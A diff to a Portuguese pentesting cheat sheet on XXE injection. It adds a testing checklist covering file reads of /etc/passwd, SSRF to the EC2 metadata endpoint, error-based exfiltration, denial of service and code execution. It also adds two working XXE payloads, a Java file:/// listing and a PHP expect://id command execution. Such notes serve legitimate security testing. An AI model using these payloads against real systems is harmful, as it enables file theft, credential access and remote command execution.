@@ -1,7 +1,23 @@
 # XML External Entity
 :hamburger: A vulnerabilidade XXE (XML External Entity) ocorre quando a aplicação processa dados XML de maneira inadequada, permitindo que um atacante insira entidades externas no XML.
 
-Payload 
+## :fries:Checklist
+
+- Identifique "pontos de entrada" que faz o processamento do XML
+- Identifique "ponto de entrada" que aceita JSON enviando XML
+- Identifique "ponto de entrada" que aceita imagens usando SVG
+- Identifique "ponto de entrada" que aceita documentos usando arquivos DOCX ou PDF
+- Use Content-Type: application/xml
+- Tente identificar o arquivo DTD interno
+- Teste "external entities" com um payload simples
+- Teste "external entities" para ler arquivos internos (Ex.: for Linux /etc/passwd)
+- Teste "external entities" com requisição para endpoint externos (Ex.: collaborator or webhook.site)
+- Teste "external entities" com requisição para endpoints internos (Ex.: EC2 metadata endpoint http://169.254.169.254/latest/meta-data)
+- Observe filtros e restrições: "trigger" mensagens de erro para exfiltrar informações
+- Teste "denial of service"
+- Teste "execução de código"
+Test for code execution
+
 ```
 ## Formulário de Login 
 
@@ -392,6 +408,27 @@ xxe.xml
 # Arquivo DTD
 <!ENTITY all "%start;%stuff;%end;">
 ```
+```
+# Restricted to Java applications
+
+<!--?xml version="1.0" ?-->
+<!DOCTYPE aa[<!ELEMENT bb ANY>
+<!ENTITY xxe SYSTEM "file:///">]>
+<foo>
+  <bar>&xxe;</bar>
+</foo>
+```
+```
+# Only works in the PHP 'expect' module is available
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "expect://id" >]>
+<foo>
+    <bar>&xxe;</bar>
+</foo>
+```
+
 <p>:orange_book: Payloads: 
 <p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection</p>
 <p>https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf</p>
